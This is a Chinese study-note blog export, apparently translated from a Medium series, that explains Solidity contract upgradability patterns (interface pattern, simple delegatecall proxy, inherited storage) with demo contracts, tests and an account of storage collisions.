    <title>StudyRecord-Upgradability_patterns_in_Solidity_Part1</title>
    <url>/2022/13101.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://medium.com/@shub.sharma350/upgradability-patterns-in-solidity-part-1-13e23ce1f144">Upgradability patterns in Solidity — Part 1</a> 学习记录大部分机翻+自己进行demo测试原作者示例代码<a href="https://github.com/shu-boom/upgradability">github地址</a>我的调试代码<a href="https://github.com/jerrychan807/my-awesome-solidity/tree/main/upgradability">github地址</a></p>
<h1>介绍：</h1>
<p>软件开发是一个迭代过程，好的软件系统需要经常更新以消除现有错误并添加新功能。</p>
<p>智能合约是存储在区块链上的不可变程序。每个智能合约都有一个唯一的地址。用户将交易发送到智能合约的地址，以执行存储在该合约中的代码。</p>
<p>每次升级都可以上传新的智能合约，并在每次合约升级时为用户提供一个新地址。然而，这不是一个非常用户友好的设计模式。</p>
<p>为了方便用户更换地址，可以维护注册表合约。通过某合约提供的函数可方便让用户查询到新合约的最新地址。</p>
<p>例如，AAVE 维护一个<code>地址提供者注册表</code>提供不同市场的活跃借贷池地址,即用户可以调用合约的函数获取最新的地址。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220628000242.png" alt="20220628000242" /></p>
<p>建议在不更改地址和丢失数据的情况下升级合约</p>
<h1>接口模式：</h1>
<p>这是一种常见的面向对象的编程模式。在这种模式下，用户总是与包含一些业务逻辑的<code>主合约</code>进行交互；但是，<code>主合约</code>也依赖于与<code>卫星合约</code>通信的接口。主合约包含一个<code>upgradeTo</code>方法，该方法允许主合约的所有者更改实现地址</p>
<h1>实现：</h1>
<h2 id="ILogic-sol">ILogic.sol</h2>
<p>接口定义了应用程序逻辑的函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// An interface is like the contract ABI in Solidity.</span></span><br><span class="line"><span class="comment">// The motivation for interfaces </span></span><br><span class="line"><span class="comment">// An interface can only contain external methods.</span></span><br><span class="line"><span class="comment">// It can only inherit from other interfaces. </span></span><br><span class="line"><span class="comment">// They do not have their own storage. Therefore, state variables are not allowed</span></span><br><span class="line"><span class="comment">// They can have user-defined types such as Struct and Enums.&#x27;</span></span><br><span class="line"><span class="comment">// They can have event declaration.</span></span><br><span class="line"><span class="comment">// A base contract can only implement some of the interface methods. </span></span><br><span class="line"><span class="comment">// Interfaces allows one contract to communicate with othercontracts that implement the interface. </span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ILogic</span> &#123;</span><br><span class="line">    struct <span class="title class_">User</span>&#123;</span><br><span class="line">        bytes32 firstName;</span><br><span class="line">        bytes32 lastName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getFirstName</span>(<span class="params"></span>) external <span class="title function_">returns</span>(bytes32);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getLastName</span>(<span class="params"></span>) external <span class="title function_">returns</span>(bytes32);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setFirstName</span>(<span class="params">bytes32 _firstName</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setLastName</span>(<span class="params">bytes32 _lastName</span>) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SatelliteContractV1-sol">SatelliteContractV1.sol</h2>
<p>卫星合约单独驻留在区块链上，实现接口中描述的功能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./../../interfaces/simple-interface/ILogic.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SatelliteContractV1</span> is <span class="title class_">ILogic</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">ILogic</span>.<span class="property">User</span> logic;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getFirstName</span>(<span class="params"></span>) <span class="title function_">override</span>(<span class="title class_">ILogic</span>) external view <span class="title function_">returns</span>(<span class="params">bytes32</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> logic.<span class="property">firstName</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getLastName</span>(<span class="params"></span>) <span class="title function_">override</span>(<span class="title class_">ILogic</span>) external view <span class="title function_">returns</span>(<span class="params">bytes32</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> logic.<span class="property">lastName</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setFirstName</span>(<span class="params">bytes32 _firstName</span>) <span class="title function_">override</span>(<span class="title class_">ILogic</span>) external&#123;</span><br><span class="line">        logic.<span class="property">firstName</span> = _firstName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setLastName</span>(<span class="params">bytes32 _lastName</span>) <span class="title function_">override</span>(<span class="title class_">ILogic</span>) external&#123;</span><br><span class="line">        logic.<span class="property">lastName</span> = _lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MainContract-sol">MainContract.sol</h2>
<p><code>MainContract</code> 在内部使用 <code>SatteliteContract</code> 的数据来响应用户的查询。例如，当询问 <code>firstName</code> 时，<code>MainContract</code> 只返回存储在 <code>SatteliteContract</code> 中的值。</p>
<p>如果 <code>MainContract</code> 的所有者想要更改逻辑，他们需要部署一个单独的 <code>SatteliteContract</code> 并修改业务逻辑，并使用新的 <code>SatteliteContract</code> 的地址调用 <code>MainContract</code> 的<code>upgradeTo</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./../../interfaces/simple-interface/ILogic.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MainContract</span> &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">ILogic</span> satteliteContract;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.修改业务逻辑 2.执行更新函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">upgradeTo</span>(<span class="params">address newImplementation</span>) public &#123;</span><br><span class="line">        <span class="comment">// 更新</span></span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Only Owner&quot;</span>);</span><br><span class="line">        satteliteContract = <span class="title class_">ILogic</span>(newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MainContract 在内部使用 SatteliteContract 的数据来响应用户的查询</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getFirstName</span>(<span class="params"></span>) external returns (bytes32)&#123;</span><br><span class="line">        <span class="keyword">return</span> satteliteContract.<span class="title function_">getFirstName</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getLastName</span>(<span class="params"></span>) external returns (bytes32)&#123;</span><br><span class="line">        <span class="keyword">return</span> satteliteContract.<span class="title function_">getLastName</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setFirstName</span>(<span class="params">bytes32 _firstName</span>) external &#123;</span><br><span class="line">        satteliteContract.<span class="title function_">setFirstName</span>(_firstName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setLastName</span>(<span class="params">bytes32 _lastName</span>) external &#123;</span><br><span class="line">        satteliteContract.<span class="title function_">setLastName</span>(_lastName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="缺点：">缺点：</h2>
<p>虽然实现简单，但<strong>接口模式非常死板且效率低下</strong>。<br />
<code>ILogic</code> 接口用于 <code>MainContract</code> 内部，其地址不允许更改。因此，无法修改 <code>ILogic</code> 接口内的函数。此外，实际数据存储在扩展此 <code>ILogic</code> 接口的合同中。当用户设置名字和姓氏时，这些值会在 <code>SatteliteContract</code> 中更新。<br />
<code>MainContract</code> 只是调用 <code>SatteliteContract</code> 中的函数。如果需要更新逻辑，则需要创建一个新的 <code>SatteliteContract</code>。</p>
<p>一旦使用新的 <code>SatteliteContract</code> 的地址调用 <code>MainContract</code> 的 <code>upgradeTo</code> 方法，存储在原始 <code>SatteliteContract</code> 中的数据就不能再被 <code>MainContract</code> 访问。</p>
<p>所以，必须将原始 <code>SatteliteContract</code> 的存储复制到新的 <code>SatteliteContract</code> 以保持不同版本之间的应用程序状态完整。</p>
<p>不幸的是，复制数据是一项消耗大量gas的操作。<code>SSTORE</code> 操作需要 5000 到 20000 个 gas，复制大型存储数据可能会导致达到交易或块 gas 限制。</p>
<p><strong>理想情况下，良好的可升级模式应该是灵活且存储高效的。</strong></p>
<h1>灵活性和存储效率：</h1>
<p><strong>可灵活修改逻辑是升级合约模式中比较好的特点。换句话说，开发人员应该能够轻松地修改现有逻辑或向合约添加/删除新逻辑。</strong></p>
<p>在接口模式中，<code>MainContrac</code>t 依赖于 <code>ILogic</code> 接口与 <code>SatteliteContract</code> 进行通信。</p>
<p>由于 <code>MainContract</code> 导入了 <code>ILogic</code> 接口，因此无法向 <code>ILogic </code>接口添加新功能（不部署新的 <code>MainContract</code>，因为这会更改应用程序地址）。</p>
<p><strong>这种逻辑依赖关系使得合约耦合性比较大</strong>。一个好的方法是从 <code>MainContract</code> 中删除这个接口依赖，这样逻辑就很容易修改。</p>
<p>然而，移除接口会隐藏 <code>MainContract</code> 的逻辑实现。换句话说，删除逻辑接口后，<code>MainContract</code> 的职责将减少为仅充当用户和逻辑合约之间的代理。</p>
<p><strong>幸运的是，Solidity 允许使用 <code>fallback</code> 函数和 <code>delegatecall </code>关键字的代理模式。</strong><br />
在讨论代理模式实现之前，让我们先解决高效存储的问题。<br />
<strong>存储管理在设计良好的升级模式中起着至关重要的作用。一个好的存储设计必须是节约gas的。</strong></p>
<p>继承、永久和非结构化存储是一些常见存储模式的示例。许多存储模式依赖于代理和低级委托调用。因此，建议先了解代理和委托调用。</p>
<h1>简单代理模式：</h1>
<p><code>Logic</code> 合约包含应用程序的业务逻辑。代理合约只是将传入调用委托给逻辑合约并将响应返回给用户。代理合约使用回退功能。当tx包含代理合约中不存在的方法时，将执行回退函数。</p>
<p>在回退函数中，我们使用 委托调用函数 来执行逻辑合约中的给定函数。</p>
<p><strong>但是，存储属于代理合约。这是委托调用的一个重要属性。</strong></p>
<p>如果合约 A 使用委托调用来执行合约 B 中存在的函数，则合约 A 本质上是允许合约 B 修改合约 A 的存储。换句话说，合约 A 的状态将被使用委托调用方法调用的函数修改，而合约 B 的存储保持不变。</p>
<p>通过编写测试用例来看看我们的代理模式是否表现正确。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> Logic, Proxy, accounts, Contract</span><br><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy_contracts</span>():</span><br><span class="line">    logic_tx = Logic.deploy(&#123;<span class="string">&quot;from&quot;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    proxy_tx = Proxy.deploy(&#123;<span class="string">&quot;from&quot;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    proxy_tx.setImplementationAddress(logic_tx.address)</span><br><span class="line">    <span class="keyword">return</span> (proxy_tx, logic_tx.address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_proxy_pattern_implementation_equals_to_logic_address</span>():</span><br><span class="line">    (proxy, logicAddress) = deploy_contracts()</span><br><span class="line">    <span class="keyword">assert</span> proxy.getImplementationAddress() == logicAddress</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_can_get_value_from_implementation</span>():</span><br><span class="line">    (proxy, logicAddress) = deploy_contracts()</span><br><span class="line">     <span class="comment"># 重点</span></span><br><span class="line">    proxy_logic = Contract.from_abi(<span class="string">&quot;Logic&quot;</span>, proxy.address, Logic.abi)</span><br><span class="line">    <span class="keyword">assert</span> proxy_logic.getMyInt() == <span class="number">10</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_can_set_value_from_proxy</span>():</span><br><span class="line">    (proxy, logicAddress) = deploy_contracts()</span><br><span class="line">    <span class="comment"># 重点:通过代理合约去调用 logic合约</span></span><br><span class="line">    proxy_logic = Contract.from_abi(<span class="string">&quot;Logic&quot;</span>, proxy.address, Logic.abi)</span><br><span class="line">    proxy_logic.setMyInt(<span class="number">20</span>, &#123;<span class="string">&quot;from&quot;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="keyword">assert</span> proxy.getImplementationAddress() == logicAddress</span><br></pre></td></tr></table></figure>
<p>我是用hardhat编写同样的测试逻辑</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试结果</span></span><br><span class="line">expect logicMyInt = <span class="number">10</span> </span><br><span class="line"><span class="comment">// 代理合约调用 logic合约查询出来的MyInt，与预期的10不一致</span></span><br><span class="line"><span class="attr">logicMyInt</span>: <span class="number">546584486846459126461364135121053344201067465379</span></span><br><span class="line"><span class="comment">// 代理合约查询出来的实现地址</span></span><br><span class="line"><span class="attr">implementationAddress</span>: <span class="number">0x0000000000000000000000000000000000000014</span></span><br><span class="line"><span class="comment">// 部署的logic合约地址</span></span><br><span class="line">logic <span class="title class_">Address</span>: <span class="number">0x5FbDB2315678afecb367f032d93F642f64180aa3</span></span><br></pre></td></tr></table></figure>
<p><code>代理合约</code>使用 <code>delegatecall</code> 方法来调用<code>逻辑合约</code>的 <code>getMyInt()</code> 函数。<code>getMyInt()</code> 函数返回 <code>myInt</code> 变量中的值。创建<code>逻辑合约</code>时，其构造函数将整数值 10 分配给 <code>myInt</code> 变量。但是，测试表明 <code>getMyInt</code> 返回一个非常大的整数值，不等于 10。这是由于<strong>存储冲突</strong>引起的。</p>
<p><strong>在智能合约中，存储分为 32 字节的插槽。EVM 是一个字长为 256 位（32 字节）的状态机。</strong><br />
合约的状态变量（myInt）映射到这些槽。<br />
<strong>访问状态变量意味着访问存储在 EVM 插槽中该状态变量位置的值。</strong></p>
<p>例如，<code>uint 256 myInt</code> 是 <code>逻辑合约</code> 中的第一个状态变量，而 <code>uint256</code> 类型值需要 32 个字节（一个完整的插槽）。由于<code>myInt</code>是第一个状态变量，所以它的值存储在第一个 EVM 插槽中。在 <code>getMyInt()</code> 函数中返回 <code>myInt</code> 意味着返回存储在 EVM 槽中变量 <code>myInt</code> 位置的值。请记住，<code>代理合约</code> 正在使用<code>delegatecall</code>来调用 <code>逻辑合约</code>中的 <code>getMyInt()</code> 函数。</p>
<p><strong>由于通过委托调用该函数，EVM 将使用代理合约的存储而不是逻辑合约的存储。</strong><br />
但是，代理合约存储有一个地址变量存储在 EVM 的第一个插槽中。</p>
<p>当从存储访问 <code>myInt</code> 变量时，EVM 返回存储在 <code>Proxy</code> 合约的第一个存储槽中的值。因此，十进制系统中的地址表示被返回并且测试用例失败。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630194901.png" alt="20220630194901" /></p>
<p>同样，当调用 <code>setMyInt()</code> 函数时，修改了实现地址而不是 <code>myInt</code> 变量。<br />
<strong>此问题称为存储冲突。这是一个关键问题，需要在我们的可升级模式中进行适当的存储管理。</strong></p>
<p>让我们在本系列的下一部分中了解一些流行的存储管理模式。</p>
<h1>Summary:</h1>
<p>软件开发是一个迭代过程，好的软件系统需要经常更新以消除现有错误并添加新功能。</p>
<p>智能合约是存储在区块链上的不可变程序，每个智能合约都有一个唯一的地址。每次升级都可以上传新的智能合约，并在每次合约升级时为用户提供一个新地址。然而，这不是一个非常用户友好的设计模式。</p>
<p>为了方便用户更换地址，可以维护注册表合约。通过某合约提供的函数可方便让用户查询到新合约的最新地址。类似<code>AAVE</code>的注册表合约</p>
<p>接着探讨了接口模式和代理模式的实现。</p>
<p>接口模式：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>主合约</code>和<code>子合约</code>继承和实现同一个<code>接口合约</code></p>
</li>
<li class="lvl-2">
<p><code>子合约</code>会去具体实现每个函数</p>
</li>
<li class="lvl-2">
<p><code>主合约</code>不去具体实现，仅返回<code>子合约</code>的调用结果，类似bridge的作用</p>
</li>
<li class="lvl-2">
<p>用户和<code>主合约</code>交互，主合约地址不变</p>
</li>
<li class="lvl-2">
<p>升级的时候，仅升级<code>子合约</code></p>
</li>
<li class="lvl-2">
<p>但因为接口合约有写死了，所以只能改变原有函数的逻辑，不能增减函数</p>
</li>
<li class="lvl-2">
<p>每次升级，新的子合约和旧的子合约间要进行数据同步，耗gas</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220628112359.png" alt="20220628112359" /></p>
<p>简单代理模式：</p>
<p>合约间的关系：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>逻辑合约</code>包含应用程序的业务逻辑。</p>
</li>
<li class="lvl-2">
<p><code>代理合约</code>只是将传入调用委托给<code>逻辑合约</code>并将响应返回给用户。</p>
</li>
<li class="lvl-2">
<p><code>代理合约</code>使用回退功能。当tx包含代理合约中不存在的方法时，将执行回退函数。</p>
</li>
<li class="lvl-2">
<p>在回退函数中，我们使用 委托调用函数 来执行实现（逻辑）合约中的给定函数。</p>
</li>
</ul>
<p>存储：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>委托调用的一个重要属性：存储在代理合约里。</p>
</li>
<li class="lvl-2">
<p><code>代理合约</code>委托调用来执行<code>逻辑合约</code>中存在的函数,<code>代理合约</code>允许<code>逻辑合约</code>修改其存储，而<code>逻辑合约</code>的存储保持不变。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220628112426.png" alt="20220628112426" /></p>
<p>简单代理模式的实现中出现了存储冲突的问题，需要在接下来的系列文章中继续探讨</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://medium.com/@shub.sharma350/upgradability-patterns-in-solidity-part-1-13e23ce1f144">Upgradability patterns in Solidity — Part 1</a></p>
</li>
<li class="lvl-2">
<p><a href="https://medium.com/taipei-ethereum-meetup/solidity-data-collision-51e88f1529a8">Solidity Data Collision</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Upgradability_patterns_in_Solidity_Part2</title>
    <url>/2022/12909.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://medium.com/@shub.sharma350/upgradability-patterns-in-solidity-part-2-8a2e531d80f8">Upgradability patterns in Solidity — Part 2</a> 学习记录大部分机翻+自己进行demo测试原作者示例代码<a href="https://github.com/shu-boom/upgradability">github地址</a>我的调试代码<a href="https://github.com/jerrychan807/my-awesome-solidity/tree/main/upgradability">github地址</a></p>
<h1>存储模式：</h1>
<p>接着part1结尾的出现<strong>存储冲突</strong>的问题，我们可以通过采用良好的存储模式来避免存储冲突。</p>
<p><strong>三种流行的模式是继承存储、非结构化存储和永久存储(Inherited Storage, Unstructured Storage, and Eternal Storage)</strong>。</p>
<h2 id="继承存储：">继承存储：</h2>
<p>避免状态冲突的一种方法是在<code>逻辑</code>和<code>代理合约</code>之间保持相同的存储顺序。让我们检查一个示例实现以获得更好的理解。</p>
<h3 id="Proxy-sol">Proxy.sol:</h3>
<p><code>Proxy.sol</code> 是一个简单的代理合约，它有一个 <code>upgradeTo 方法</code>，这是一个回退方法。该合约的状态变量存在于 <code>CommonStorage.sol</code> 中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Proxy.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./CommonStorage.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Proxy</span> is <span class="title class_">CommonStorage</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">upgradeTo</span>(<span class="params">address _implementation</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Only Owner&quot;</span>);</span><br><span class="line">        implementation = _implementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fallback</span>() external&#123;</span><br><span class="line">        implementation = <span class="title function_">getImplementationAddress</span>();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="attr">ptr</span>:=<span class="title function_">mload</span>(<span class="number">0x40</span>)</span><br><span class="line">            <span class="title function_">calldatacopy</span>(ptr, <span class="number">0</span>, <span class="title function_">calldatasize</span>())</span><br><span class="line">            <span class="keyword">let</span> result := <span class="title function_">delegatecall</span>(</span><br><span class="line">                <span class="title function_">gas</span>(),</span><br><span class="line">                <span class="title function_">sload</span>(implementation.<span class="property">slot</span>),</span><br><span class="line">                ptr,</span><br><span class="line">                <span class="title function_">calldatasize</span>(),</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">            <span class="title function_">returndatacopy</span>(ptr, <span class="number">0</span>, <span class="title function_">returndatasize</span>())</span><br><span class="line">            <span class="keyword">switch</span> result</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> &#123; <span class="title function_">revert</span>(ptr, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">            <span class="keyword">default</span> &#123; <span class="keyword">return</span>(ptr, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="CommonStorage-sol">CommonStorage.sol:</h3>
<p><code>CommonStorage 合约</code>由<code>代理合约</code>和<code>逻辑合约</code>共享。<code>CommonStorage 合约</code>还提供了一个公共方法来查看存储合约内部存储的当前实现地址。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CommonStorage.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CommonStorage</span> &#123;</span><br><span class="line">    address internal implementation;</span><br><span class="line">    address internal owner;</span><br><span class="line">    string internal firstName;</span><br><span class="line">    string internal lastName;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Returns the implementation address</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getImplementationAddress</span>(<span class="params"></span>) public view <span class="title function_">returns</span>(<span class="params">address</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> implementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="LogicV1-sol-LogicV2-sol">LogicV1.sol &amp; LogicV2.sol:</h3>
<p>在这个实现中有两个逻辑合约。<code>LogicV1 合约</code>具有用户名的访问器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LogicV1.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./CommonStorage.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">LogicV1</span> is <span class="title class_">CommonStorage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getFirstName</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">string memory</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> firstName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getLastName</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">string memory</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> lastName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setFirstName</span>(<span class="params">string calldata _firstName</span>) external &#123;</span><br><span class="line">        firstName = _firstName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setLastName</span>(<span class="params">string calldata _lastName</span>) external &#123;</span><br><span class="line">        lastName = _lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如下所示，<code>LogicV2 合约</code>扩展了 <code>LogicV1 合约</code>，后者又扩展了 <code>CommonStorage 合约</code>。由于继承，<code>LogicV2 合约</code>已经知道其父合约的状态变量。<code>LogicV2 合约</code>还为用户的年龄添加了新的状态变量和访问器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LogicV2.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./LogicV1.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">LogicV2</span> is <span class="title class_">LogicV1</span> &#123;</span><br><span class="line">    uint256 internal age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getAge</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">uint256</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setAge</span>(<span class="params">uint256 _age</span>) external &#123;</span><br><span class="line">        age = _age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，下面的测试用例利用这个实现来表明在之前的实现中遇到的状态冲突现在已经解决了。</p>
<h3 id="测试用例：">测试用例：</h3>
<p><a href="https://github.com/jerrychan807/my-awesome-solidity/blob/main/upgradability/test/inherited_storage.test.ts">测试用例</a></p>
<h3 id="测试结果：-9">测试结果：</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  Token contract</span><br><span class="line">    <span class="built_in">test</span></span><br><span class="line">Proxy try to upgrade ImplementationAddress To LogicV1.address</span><br><span class="line">[*]test_proxy_pattern_implementation_equals_to_logic_address</span><br><span class="line">Proxy setImplementationAddress successfully</span><br><span class="line">[*]test_can_set_and_get_names_from_logicv1</span><br><span class="line">   firstName: John</span><br><span class="line">   lastName: Doe</span><br><span class="line">[*]test_can_set_value_from_proxy</span><br><span class="line">Proxy try to upgrade ImplementationAddress To LogicV2.address</span><br><span class="line">[*]test_can_set_and_get_names_from_logicv2</span><br><span class="line">   firstName: Paul</span><br><span class="line">   lastName: Walker</span><br><span class="line">[*]test_can_get_and_set_age_from_proxy</span><br><span class="line">      ✔  (2274ms)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  1 passing (2s)</span><br><span class="line"></span><br><span class="line">✨  Done <span class="keyword">in</span> 6.76s.</span><br></pre></td></tr></table></figure>
<p>继承存储方法通过为<code>代理</code>和<code>逻辑合约</code>所需的<code>状态变量</code><strong>提供严格的存储顺序来解决存储冲突</strong>。</p>
<p><code>代理合约</code>正在委托对逻辑合约的调用；因此，只有代理合约的存储在使用中。</p>
<p>继承<code>公共存储合约</code>的<code>代理合约</code>可以访问其父合约的所有状态变量。每个状态变量根据其索引占用适当的内存位置。<code>LogicV1 合约</code>也继承了通用存储合约，它知道状态变量是如何存储在代理合约内部的。</p>
<p>当用户尝试设置 firstName 变量时，第三个内存槽在代理合约中被修改。同样，当代理的所有者尝试升级合约时，第一个内存槽被修改。</p>
<p>请注意，<code>LogicV2 合约</code>继承了之前的 <code>LogicV1合约</code>并指定了一个名为 age 的状态变量。在 LogicV2 中继承 LogicV1 通过保持先前声明的状态变量的顺序来防止冲突。需要继承旧合约以防止存储冲突。</p>
<p>如果 <code>LogicV2 合约</code>不继承 <code>LogicV1 合约</code>，<code>age</code> 变量将修改代理合约中的第一个存储槽。</p>
<p>这会在实现变量和年龄变量之间产生冲突。</p>
<h3 id="缺点：-2">缺点：</h3>
<p>虽然继承存储通过可升级合约解决了存储冲突问题，但这种方法也有其自身的缺点。</p>
<p>由于需要将所有先前声明的状态变量都复制到新部署的版本，因此升级变得昂贵。其中一些可能没有被使用并最终不必要地占用内存。</p>
